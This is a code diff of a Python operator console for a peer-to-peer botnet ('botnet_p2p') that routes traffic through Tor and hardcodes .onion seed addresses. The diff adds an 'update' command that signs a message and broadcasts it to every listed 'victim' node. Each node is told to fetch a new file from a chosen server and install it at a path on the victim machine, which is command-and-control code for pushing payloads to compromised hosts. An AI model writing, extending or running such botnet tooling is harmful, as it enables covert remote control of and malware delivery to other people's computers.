@@ -9,8 +9,8 @@ from cmd2 import with_argparser, with_category, categorize
 
 from botnet_p2p import ENCODING
 from botnet_p2p.message import structure_msg, sign_structured_msg
-from botnet_p2p.security import decrypt
-from botnet_p2p.operations import close_terminal
+from botnet_p2p.security import decrypt, calculate_file_hash
+from botnet_p2p.operations import close_terminal, broadcast
 
 BUFFER_SIZE = 4096
 TOR_SERVER_PORT = 50001
@@ -20,10 +20,11 @@ UPDATE_FILE = 2
 
 readline.parse_and_bind("tab: complete")
 
+
 socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
 socket.socket = socks.socksocket
 
-seed_directions = ["57yvvr2pfb46zull.onion"]
+seed_directions = [("kdq2tg4jedd5tqxs.onion", "57yvvr2pfb46zull.onion")]
 
 
 def make_blue(msg: str):
@@ -99,7 +100,7 @@ class MyPrompt(cmd2.Cmd):
         default=0,
     )
     connect_argparser.add_argument(
-        "-f",
+        "-n",
         "--file-nodes",
         dest="node_list_path",
         help="Path to file containing a list with nodes in the"
@@ -123,7 +124,7 @@ class MyPrompt(cmd2.Cmd):
 
         print_green("\n\nIntroduce position of the server in the list:")
         selected_index = int(input())
-        selected_node = node_from_index(selected_index, node_list_path)
+        selected_node = node_from_index(selected_index, seed_directions, node_list_path)
 
         try:
             self.__connect(selected_node, num_anonymizers)
@@ -137,7 +138,7 @@ class MyPrompt(cmd2.Cmd):
 
     def __connect(self, recipient: str, num_anonymizers: int = 0):
         if num_anonymizers > 0:
-            next_hop = random.choice(seed_directions)
+            next_hop = random.choice(seed_directions)[1]
         else:
             next_hop = recipient
 
@@ -173,6 +174,71 @@ class MyPrompt(cmd2.Cmd):
     def help_disconnect(self):
         print("Usage: disconnect\n\n" + "close shell\n")
 
+    update_argparser = argparse.ArgumentParser(
+        description="Send a message to each peer to update some file"
+    )
+    update_argparser.add_argument(
+        "-s",
+        "--hash-from-file",
+        type=str,
+        dest="file_path_to_hash",
+        help="File we need to calculate the has so each peers knows if they"
+        + "copy needs an update",
+        required=True,
+    )
+    update_argparser.add_argument(
+        "-f",
+        "--file-path-in-victim",
+        type=str,
+        dest="file_path_in_victim",
+        help="File path where the file to be updated is in the victim",
+        required=True,
+    )
+    update_argparser.add_argument(
+        "-n",
+        "--file-nodes",
+        dest="node_list_path",
+        help="Path to file containing a list with nodes in the"
+        + "format (name, download address, communication address)",
+        default=None,
+    )
+
+    @with_argparser(update_argparser)
+    @with_category(__botnet)
+    def do_update(self, args: argparse.Namespace):
+        if self.__private_key_path is None:
+            print_red("Private key path is not configured")
+            return
+
+        file_path = args.file_path_in_victim
+        file_path_to_hash = args.file_path_to_hash
+        node_list_path = args.node_list_path
+
+        print_green("\nWhich server has the updated file?\n")
+        node_list = complete_node_list(node_list_path)
+        print_list_with_indexes(node_list)
+
+        print_green("\n\nIntroduce position of the server in the list:")
+        selected_index = int(input())
+        selected_node = node_from_index(
+            selected_index, seed_directions, node_list_path, "down"
+        )
+
+        msg_info = {
+            "msg_type": UPDATE_FILE,
+            "msg": f"{file_path} {calculate_file_hash(file_path_to_hash)} "
+            + f"{selected_node}",
+        }
+        msg = structure_msg(msg_info)
+        signed_msg = sign_structured_msg(msg, self.__private_key_path)
+        with open(node_list_path, "r") as neighbours:
+            neighbours_info = neighbours.readlines()
+        victim_directions = [
+            line.strip().split()[2].strip() for line in neighbours_info
+        ]
+        onions = [seed_comm[1] for seed_comm in seed_directions] + victim_directions
+        broadcast(TOR_SERVER_PORT, signed_msg, onions)
+
     @with_category(__basic)
     def do_exit(self, input: str):
         return True
@@ -201,20 +267,20 @@ class MyPrompt(cmd2.Cmd):
     help_EOF = help_exit
 
 
-def complete_node_list(node_list_path: str = None):
-    seed_list = seed_name_list()
+def complete_node_list(node_list_path: str = None) -> list:
+    seed_list = seed_name_list(seed_directions)
     node_list = node_name_list(node_list_path)
     union_list = seed_list + node_list
 
     return union_list
 
 
-def seed_name_list():
+def seed_name_list(seeds: list) -> list:
     seed_list = [f"seed{i}" for i in range(len(seed_directions))]
     return seed_list
 
 
-def node_name_list(node_list_path: str = None):
+def node_name_list(node_list_path: str = None) -> list:
     if not node_list_path:
         return []
 
@@ -230,15 +296,19 @@ def print_list_with_indexes(item_list: list):
         print_green(f"{position}. {item}")
 
 
-def node_from_index(index: int, node_list_path: str = None):
+def node_from_index(
+    index: int, seed_directions: list, node_list_path: str = None, type: str = "comm"
+) -> str:
     num_seeds = len(seed_directions)
     if index < num_seeds:
-        node = seed_directions[index]
+        pos = 1 if type == "comm" else 0
+        node = seed_directions[index][pos]
     else:
+        pos = 2 if type == "comm" else 1
         if node_list_path:
             with open(node_list_path, "r") as f:
                 lines = f.readlines()
-                node = lines[index - num_seeds].split(" ")[2].strip()
+                node = lines[index - num_seeds].split()[pos].strip()
 
     return node
 
